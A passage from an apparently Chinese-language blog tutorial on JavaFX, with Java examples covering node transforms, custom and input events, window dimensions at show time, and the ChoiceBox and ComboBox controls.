class="number">50</span>, Color.BLUE);  </span><br><span class="line">  </span><br><span class="line">        transform(box);  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Pane</span>(box);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(Rectangle box)</span> &#123;  </span><br><span class="line">        <span class="comment">// we will apply transformations here  </span></span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">(Stage stage)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        stage.setScene(<span class="keyword">new</span> <span class="title class_">Scene</span>(createContent(), <span class="number">300</span>, <span class="number">300</span>, Color.GRAY));  </span><br><span class="line">        stage.show();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        launch(args);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果如下：<br><img src="/image/Pasted image 20240429224918.png" alt="20240429224918.png" /><br>在JavaFX中，一个简单的转换可以发生在三个轴之一：X，Y或Z。 示例应用程序是2D的，因此我们将只考虑X和Y轴。</p>
<h3 id="Translate"><a href="#Translate" class="headerlink" title="Translate"></a>Translate</h3><p>在JavaFX和计算机图形学中，<code>translate</code>意味着移动。 我们可以在X轴上平移100像素，在Y轴上平移200像素。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(Rectangle box)</span> &#123;</span><br><span class="line">    box.setTranslateX(<span class="number">100</span>);</span><br><span class="line">    box.setTranslateY(<span class="number">200</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果如下：<br><img src="/image/Pasted image 20240429225204.png" alt="20240429225204.png" /></p>
<h3 id="Scale"><a href="#Scale" class="headerlink" title="Scale"></a>Scale</h3><p>可以应用缩放以使节点更大或更小。 缩放值是一个比率。 默认情况下，节点在每个轴上的缩放值为1（100%）。 我们可以通过在X和Y轴上应用1.5的缩放比例来放大我们的盒子。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(Rectangle box)</span> &#123;</span><br><span class="line">    <span class="comment">// previous code</span></span><br><span class="line"></span><br><span class="line">    box.setScaleX(<span class="number">1.5</span>);</span><br><span class="line">    box.setScaleY(<span class="number">1.5</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Rotate"><a href="#Rotate" class="headerlink" title="Rotate"></a>Rotate</h3><p>节点的旋转决定了渲染节点的角度。 在2D中，唯一合理的旋转轴是Z轴。 让我们把盒子旋转30度。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(Rectangle box)</span> &#123;</span><br><span class="line">    <span class="comment">// previous code</span></span><br><span class="line"></span><br><span class="line">    box.setRotate(<span class="number">30</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果如下：<br><img src="/image/Pasted image 20240429225929.png" alt="20240429225929.png" /></p>
<h2 id="Event-Handling"><a href="#Event-Handling" class="headerlink" title="Event Handling"></a>Event Handling</h2><p>事件通知发生了重要的事情。 事件通常是事件系统的”原语”（也称为事件总线）。 一般来说，事件系统有以下三个职责：</p>
<ul>
<li><code>fire</code>（触发）事件</li>
<li>通知<code>listeners</code>（相关方）有关事件</li>
<li><code>handle</code>（处理）事件<br>事件通知机制由JavaFX平台自动完成。 因此只考虑如何触发事件，侦听事件以及如何处理。<br>首先创建一个自定义事件。<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javafx.event.Event;  </span><br><span class="line"><span class="keyword">import</span> javafx.event.EventType;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Handling</span> <span class="keyword">extends</span> <span class="title class_">Event</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> EventType&lt;Handling&gt; ANY = <span class="keyword">new</span> <span class="title class_">EventType</span>&lt;&gt;(Event.ANY, <span class="string">&quot;ANY&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> EventType&lt;Handling&gt; LOGIN_SUCCEEDED = <span class="keyword">new</span> <span class="title class_">EventType</span>&lt;&gt;(ANY, <span class="string">&quot;LOGIN_SUCCEEDED&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> EventType&lt;Handling&gt; LOGIN_FAILED = <span class="keyword">new</span> <span class="title class_">EventType</span>&lt;&gt;(ANY, <span class="string">&quot;LOGIN_FAILED&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Handling</span><span class="params">(EventType&lt;? extends Event&gt; eventType)</span> &#123;  </span><br><span class="line">        <span class="built_in">super</span>(eventType);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
由于事件类型是固定的，它们通常与事件在同一个源文件中创建。 我们可以看到有两种特定类型的事件：LOGIN_SUCCEEDED和LOGIN_FAILED。 我们可以监听这些特定类型的事件：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> ...</span><br><span class="line">node.addEventHandler(UserEvent.LOGIN_SUCCEEDED, event -&gt; &#123;</span><br><span class="line">    <span class="comment">// handle event</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
或者，我们可以处理任何<code>UserEvent</code>：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> ...</span><br><span class="line">node.addEventHandler(UserEvent.ANY, event -&gt; &#123;</span><br><span class="line">    <span class="comment">// handle event</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
最后，我们可以构建和触发自己的事件：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">UserEvent</span> <span class="variable">event</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserEvent</span>(UserEvent.LOGIN_SUCCEEDED);</span><br><span class="line"><span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> ...</span><br><span class="line">node.fireEvent(event);</span><br></pre></td></tr></table></figure>
例如，当用户尝试登录应用程序时，可能会触发<code>LOGIN_SUCCEEDED</code>或<code>LOGIN_FAILED</code>。 根据登录结果，我们可以允许用户访问应用程序或将其锁定在应用程序之外。 虽然同样的功能可以通过简单的<code>if</code>语句实现， 事件系统有一个显著的优点。 事件系统被设计成能够在各种模块（子系统）之间进行通信， 一个应用程序，而不紧密耦合它们。 因此，当用户登录时，音频系统可能会播放声音。 因此，在其自己的模块中维护所有音频相关代码。 但是，我们不会深入研究建筑风格。</li>
</ul>
<h3 id="输入事件"><a href="#输入事件" class="headerlink" title="输入事件"></a>输入事件</h3><p>按键和鼠标事件是JavaFX中最常见的事件类型。 每个<code>Node</code>都提供了所谓的“便利方法”来处理这些事件。 例如，我们可以在按下按钮时运行一些代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> ...</span><br><span class="line">button.setOnAction(event -&gt; &#123;</span><br><span class="line">    <span class="comment">// button was pressed</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>为了获得更大的灵活性，我们还可以使用以下方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> ...</span><br><span class="line">button.setOnMouseEntered(e -&gt; ...);</span><br><span class="line">button.setOnMouseExited(e -&gt; ...);</span><br><span class="line">button.setOnMousePressed(e -&gt; ...);</span><br><span class="line">button.setOnMouseReleased(e -&gt; ...);</span><br></pre></td></tr></table></figure>
<p>上面的对象<code>e</code>属于类型<code>MouseEvent</code>，可以通过查询来获得有关事件的各种信息， 例如<code>x</code>和<code>y</code>位置、点击次数等。 最后，我们可以对keys做同样的事情：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> ...</span><br><span class="line">button.setOnKeyPressed(e -&gt; ...);</span><br><span class="line">button.setOnKeyReleased(e -&gt; ...);</span><br></pre></td></tr></table></figure>
<p>这里的对象<code>e</code>属于类型<code>KeyEvent</code>，它携带有关键代码的信息，然后可以映射这些信息 键盘上的一个真实的物理键。</p>
<h2 id="Timing"><a href="#Timing" class="headerlink" title="Timing"></a>Timing</h2><p>理解JavaFX UI控件的创建和控件的显示之间的时间差异非常重要。 在创建UI控件时—通过直接API对象创建或通过FXML—您可能会丢失某些屏幕几何值，例如窗口的尺寸。这是以后可用的，在屏幕显示给用户的瞬间。 该显示事件称为OnShown，是指分配窗口和完成最终布局计算的时间。</p>
<p>为了演示这一点，考虑以下程序，该程序在创建UI控件时显示屏幕尺寸，在显示屏幕时显示屏幕尺寸。 下面的屏幕截图显示了程序的运行。 在创建UI控件（new VBox(), new Scene(), primaryStage.setScene()）时，没有可用的实际窗口高度和宽度值，这可以通过未定义的“NaN”值来证明。<br><img src="/image/Pasted image 20240430093300.png" alt="20240430093300.png" /><br>但是，一旦显示窗口，宽度和高度的值就可用了。 程序为OnShown事件注册一个事件处理程序，并准备相同的输出。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javafx.application.Application;  </span><br><span class="line"><span class="keyword">import</span> javafx.beans.binding.Bindings;  </span><br><span class="line"><span class="keyword">import</span> javafx.beans.property.DoubleProperty;  </span><br><span class="line"><span class="keyword">import</span> javafx.beans.property.SimpleDoubleProperty;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.Scene;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.control.Label;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.control.TextField;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.layout.GridPane;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.layout.HBox;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.layout.VBox;  </span><br><span class="line"><span class="keyword">import</span> javafx.stage.Stage;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> javafx.geometry.Pos.CENTER;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StartVsShownJavaFXApp</span> <span class="keyword">extends</span> <span class="title class_">Application</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">DoubleProperty</span> <span class="variable">startX</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDoubleProperty</span>();  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">DoubleProperty</span> <span class="variable">startY</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDoubleProperty</span>();  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">DoubleProperty</span> <span class="variable">shownX</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDoubleProperty</span>();  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">DoubleProperty</span> <span class="variable">shownY</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDoubleProperty</span>();  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">(Stage primaryStage)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Label</span> <span class="variable">startLabel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Start Dimensions&quot;</span>);  </span><br><span class="line">        <span class="type">TextField</span> <span class="variable">startTF</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TextField</span>();  </span><br><span class="line">        startTF.textProperty().bind(  </span><br><span class="line">                Bindings.format(<span class="string">&quot;(%.1f, %.1f)&quot;</span>, startX, startY)  </span><br><span class="line">        );  </span><br><span class="line">  </span><br><span class="line">        System.out.println(startX);  </span><br><span class="line">        System.out.println(startY);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Label</span> <span class="variable">shownLabel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Shown Dimensions&quot;</span>);  </span><br><span class="line">        <span class="type">TextField</span> <span class="variable">shownTF</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TextField</span>();  </span><br><span class="line">        shownTF.textProperty().bind(  </span><br><span class="line">                Bindings.format(<span class="string">&quot;(%.1f, %.1f)&quot;</span>, shownX, shownY)  </span><br><span class="line">        );  </span><br><span class="line">  </span><br><span class="line">        <span class="type">GridPane</span> <span class="variable">gp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GridPane</span>();  </span><br><span class="line">        gp.add( startLabel, <span class="number">0</span>, <span class="number">0</span> );  </span><br><span class="line">        gp.add( startTF, <span class="number">1</span>, <span class="number">0</span> );  </span><br><span class="line">        gp.add( shownLabel, <span class="number">0</span>, <span class="number">1</span> );  </span><br><span class="line">        gp.add( shownTF, <span class="number">1</span>, <span class="number">1</span> );  </span><br><span class="line">        gp.setHgap(<span class="number">10</span>);  </span><br><span class="line">        gp.setVgap(<span class="number">10</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">HBox</span> <span class="variable">hbox</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HBox</span>(gp);  </span><br><span class="line">        hbox.setAlignment(CENTER);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">VBox</span> <span class="variable">vbox</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VBox</span>(hbox);  </span><br><span class="line">        vbox.setAlignment(CENTER);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Scene</span> <span class="variable">scene</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scene</span>( vbox, <span class="number">480</span>, <span class="number">320</span> );  </span><br><span class="line">  </span><br><span class="line">        primaryStage.setScene( scene );  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// before show()...I just set this to 480x320, right?  </span></span><br><span class="line">        startX.set( primaryStage.getWidth() );  </span><br><span class="line">        startY.set( primaryStage.getHeight() );  </span><br><span class="line">  </span><br><span class="line">        primaryStage.setOnShown( (evt) -&gt; &#123;  </span><br><span class="line">            shownX.set( primaryStage.getWidth() );  </span><br><span class="line">            shownY.set( primaryStage.getHeight() );  <span class="comment">// all available now  </span></span><br><span class="line">        &#125;);  </span><br><span class="line">  </span><br><span class="line">        primaryStage.setTitle(<span class="string">&quot;Start Vs. Shown&quot;</span>);  </span><br><span class="line">        primaryStage.show();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        launch(args);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="UI控件"><a href="#UI控件" class="headerlink" title="UI控件"></a>UI控件</h1><h2 id="ChoiceBox"><a href="#ChoiceBox" class="headerlink" title="ChoiceBox"></a>ChoiceBox</h2><p>这篇文章展示了<code>ChoiceBox</code>。 <code>ChoiceBox</code>控件是一个值列表，用户可以从中进行选择。 在这个特定的实现中，有一个空值，它使选择成为可选的。<br>下面为一个示例：<br>将<code>Label</code>、<code>ChoiceBox</code>和<code>Button</code>放入HBox。 在保存<code>Button</code>上设置一个操作，打印出该值。<br><code>ChoiceBox</code>最简单的用法是用String填充它。 本文中的<code>ChoiceBox</code>构建在一个名为<code>Pair</code>的JavaFX类上。 <code>Pair</code>是任何键&#x2F;值对的通用容器，可以用来代替域或其他特殊用途的对象。 字符串只有在不需要操作就可以使用或者可以一致地解码的情况下才应该使用。<br><code>ChoiceBox</code>最简单的用法是用String填充它。 本文中的<code>ChoiceBox</code>构建在一个名为<code>Pair</code>的JavaFX类上。 <code>Pair</code>是任何键&#x2F;值对的通用容器，可以用来代替域或其他特殊用途的对象。 字符串只有在不需要操作就可以使用或者可以一致地解码的情况下才应该使用。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javafx.application.Application;  </span><br><span class="line"><span class="keyword">import</span> javafx.geometry.Insets;  </span><br><span class="line"><span class="keyword">import</span> javafx.geometry.Pos;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.Scene;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.control.Button;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.control.ChoiceBox;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.control.Label;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.layout.HBox;  </span><br><span class="line"><span class="keyword">import</span> javafx.stage.Stage;  </span><br><span class="line"><span class="keyword">import</span> javafx.util.Pair;  </span><br><span class="line"><span class="keyword">import</span> javafx.util.StringConverter;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;  </span><br><span class="line"><span class="keyword">import</span> java.util.List;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ChoiceApp</span> <span class="keyword">extends</span> <span class="title class_">Application</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> Pair&lt;String, String&gt; EMPTY_PAIR = <span class="keyword">new</span> <span class="title class_">Pair</span>&lt;&gt;(<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ChoiceBox&lt;Pair&lt;String,String&gt;&gt; assetClass = <span class="keyword">new</span> <span class="title class_">ChoiceBox</span>&lt;&gt;();  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">(Stage primaryStage)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Label</span> <span class="variable">label</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Asset Class:&quot;</span>);  </span><br><span class="line">        assetClass.setPrefWidth(<span class="number">200</span>);  </span><br><span class="line">        assetClass.setValue(<span class="keyword">new</span> <span class="title class_">Pair</span>&lt;&gt;(<span class="string">&quot;Equipment&quot;</span>, <span class="string">&quot;20000&quot;</span>));  </span><br><span class="line">        <span class="type">Button</span> <span class="variable">saveButton</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;Save&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">HBox</span> <span class="variable">hbox</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HBox</span>(  </span><br><span class="line">                label,  </span><br><span class="line">                assetClass,  </span><br><span class="line">                saveButton);  </span><br><span class="line">        hbox.setSpacing( <span class="number">10.0d</span> );  </span><br><span class="line">        hbox.setAlignment(Pos.CENTER );  </span><br><span class="line">        hbox.setPadding( <span class="keyword">new</span> <span class="title class_">Insets</span>(<span class="number">40</span>) );  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Scene</span> <span class="variable">scene</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scene</span>(hbox);  </span><br><span class="line">  </span><br><span class="line">        initChoice();  </span><br><span class="line">  </span><br><span class="line">        saveButton.setOnAction(  </span><br><span class="line">                (evt) -&gt; System.out.println(<span class="string">&quot;saving &quot;</span> + assetClass.getValue())  </span><br><span class="line">        );  </span><br><span class="line">  </span><br><span class="line">        primaryStage.setTitle(<span class="string">&quot;ChoicesApp&quot;</span>);  </span><br><span class="line">        primaryStage.setScene( scene );  </span><br><span class="line">        primaryStage.show();  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initChoice</span><span class="params">()</span> &#123;  </span><br><span class="line">  </span><br><span class="line">        List&lt;Pair&lt;String,String&gt;&gt; assetClasses = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();  </span><br><span class="line">        assetClasses.add( <span class="keyword">new</span> <span class="title class_">Pair</span>&lt;&gt;(<span class="string">&quot;Equipment&quot;</span>, <span class="string">&quot;20000&quot;</span>));  </span><br><span class="line">        assetClasses.add( <span class="keyword">new</span> <span class="title class_">Pair</span>&lt;&gt;(<span class="string">&quot;Furniture&quot;</span>, <span class="string">&quot;21000&quot;</span>));  </span><br><span class="line">        assetClasses.add( <span class="keyword">new</span> <span class="title class_">Pair</span>&lt;&gt;(<span class="string">&quot;Investment&quot;</span>, <span class="string">&quot;22000&quot;</span>));  </span><br><span class="line">  </span><br><span class="line">        assetClass.setConverter( <span class="keyword">new</span> <span class="title class_">StringConverter</span>&lt;Pair&lt;String,String&gt;&gt;() &#123;  </span><br><span class="line">            <span class="meta">@Override</span>  </span><br><span class="line">            <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">(Pair&lt;String, String&gt; pair)</span> &#123;  </span><br><span class="line">                <span class="keyword">return</span> pair.getKey();  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="meta">@Override</span>  </span><br><span class="line">            <span class="keyword">public</span> Pair&lt;String, String&gt; <span class="title function_">fromString</span><span class="params">(String string)</span> &#123;  </span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;);  </span><br><span class="line">  </span><br><span class="line">        assetClass.getItems().add( EMPTY_PAIR );  </span><br><span class="line">        assetClass.getItems().addAll( assetClasses );  </span><br><span class="line">        assetClass.setValue(<span class="keyword">new</span> <span class="title class_">Pair</span>&lt;&gt;(<span class="string">&quot;Equipment&quot;</span>, <span class="string">&quot;20000&quot;</span>));  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果如下：<br><img src="/image/Pasted image 20240430110534.png" alt="20240430110534.png" /><br><img src="/image/Pasted image 20240430110615.png" alt="20240430110615.png" /></p>
<h3 id="StringConverter"><a href="#StringConverter" class="headerlink" title="StringConverter"></a>StringConverter</h3><p>当使用一个复杂的对象来支持一个<code>ChoiceBox</code>时，需要一个<code>StringConverter</code>。 这个对象将一个String序列化到<code>ChoiceBox</code>和从<code>Pair</code>序列化。 对于这个程序，只需要编写toString（）来替换undefined对象的默认toString（）。 (Both toString和fromString需要一个实现才能编译。）<br>空对象EMPTY_PAIR用于防止空指针插入。 从assetClass（）.getValue（）返回的值可以被一致地访问和比较，而不需要添加特殊的null处理逻辑。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> Pair&lt;String, String&gt; EMPTY_PAIR = <span class="keyword">new</span> <span class="title class_">Pair</span>&lt;&gt;(<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initChoice</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    List&lt;Pair&lt;String,String&gt;&gt; assetClasses = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    assetClasses.add( <span class="keyword">new</span> <span class="title class_">Pair</span>(<span class="string">&quot;Equipment&quot;</span>, <span class="string">&quot;20000&quot;</span>));</span><br><span class="line">    assetClasses.add( <span class="keyword">new</span> <span class="title class_">Pair</span>(<span class="string">&quot;Furniture&quot;</span>, <span class="string">&quot;21000&quot;</span>));</span><br><span class="line">    assetClasses.add( <span class="keyword">new</span> <span class="title class_">Pair</span>(<span class="string">&quot;Investment&quot;</span>, <span class="string">&quot;22000&quot;</span>));</span><br><span class="line"></span><br><span class="line">    assetClass.setConverter( <span class="keyword">new</span> <span class="title class_">StringConverter</span>&lt;Pair&lt;String,String&gt;&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">(Pair&lt;String, String&gt; pair)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> pair.getKey();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Pair&lt;String, String&gt; <span class="title function_">fromString</span><span class="params">(String string)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    assetClass.getItems().add( EMPTY_PAIR );</span><br><span class="line">    assetClass.getItems().addAll( assetClasses );</span><br><span class="line">    assetClass.setValue( EMPTY_PAIR );</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>选择框用于从值列表中进行选择。 当值列表是复杂类型时，提供StringFormatter将列表对象序列化为可表示的对象。 如果可能，请使用空对象（而不是null）来支持可选值。</p>
<h2 id="ComboBox"><a href="#ComboBox" class="headerlink" title="ComboBox"></a>ComboBox</h2><p><code>ComboBox</code>是一个混合控件，它提供一个值列表和一个编辑控件。 本文演示了<code>ComboBox</code>的基本形式，这是一个基于复杂数据结构的不可编辑的项目列表。<br>下面是一个示例：<br>向HBox添加了一个Label、一个ComboBox和一个Button。 ComboBox被实例化为一个字段，并在后面的initCombo（）方法中初始化。 处理程序放在保存按钮上，如果选择了某个项目，则输出一个值，如果未选择任何项目，则输出一条特殊消息。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javafx.application.Application;  </span><br><span class="line"><span class="keyword">import</span> javafx.geometry.Insets;  </span><br><span class="line"><span class="keyword">import</span> javafx.geometry.Pos;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.Scene;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.control.*;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.layout.HBox;  </span><br><span class="line"><span class="keyword">import</span> javafx.stage.Stage;  </span><br><span class="line"><span class="keyword">import</span> javafx.util.Callback;  </span><br><span class="line"><span class="keyword">import</span> javafx.util.Pair;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;  </span><br><span class="line"><span class="keyword">import</span> java.util.List;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CombosApp</span> <span class="keyword">extends</span> <span class="title class_">Application</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ComboBox&lt;Pair&lt;String, String&gt;&gt; account = <span class="keyword">new</span> <span class="title class_">ComboBox</span>&lt;&gt;();  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> Pair&lt;String, String&gt; EMPTY_PAIR = <span class="keyword">new</span> <span class="title class_">Pair</span>&lt;&gt;(<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">(Stage primaryStage)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Label</span> <span class="variable">accountsLabel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Account:&quot;</span>);  </span><br><span class="line">        account.setPrefWidth(<span class="number">200</span>);  </span><br><span class="line">        <span class="type">Button</span> <span class="variable">saveButton</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;Save&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">HBox</span> <span class="variable">hbox</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HBox</span>(  </span><br><span class="line">                accountsLabel,  </span><br><span class="line">                account,  </span><br><span class="line">                saveButton);  </span><br><span class="line">        hbox.setSpacing( <span class="number">10.0d</span> );  </span><br><span class="line">        hbox.setAlignment(Pos.CENTER );  </span><br><span class="line">        hbox.setPadding( <span class="keyword">new</span> <span class="title class_">Insets</span>(<span class="number">40</span>) );  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Scene</span> <span class="variable">scene</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scene</span>(hbox);  </span><br><span class="line">  </span><br><span class="line">        initCombo();  </span><br><span class="line">  </span><br><span 